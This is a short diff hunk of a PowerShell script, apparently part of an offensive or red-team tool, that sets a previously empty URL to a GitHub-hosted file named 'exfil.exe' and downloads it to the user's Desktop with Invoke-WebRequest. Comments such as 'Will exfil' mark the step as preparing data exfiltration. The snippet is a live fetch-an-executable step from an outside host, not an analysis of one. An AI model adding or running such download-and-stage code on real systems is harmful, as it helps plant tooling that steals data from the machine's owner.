@@ -12,7 +12,7 @@ if (Test-Path -Path $Folder) {
   "Test to see if we are exfil-ing"
   if (Test-Path -Path $Exfil -PathType Leaf) {
     "Will exfil"
-    $URL = ''
+    $URL = 'https://github.com/PoesRaven/public/raw/master/exfil.exe'
     $ExfilPath = $HOME + '/Desktop/exfil.exe'
     "Grabbing file"
     Invoke-WebRequest -URI $URL -OutFile $ExfilPath
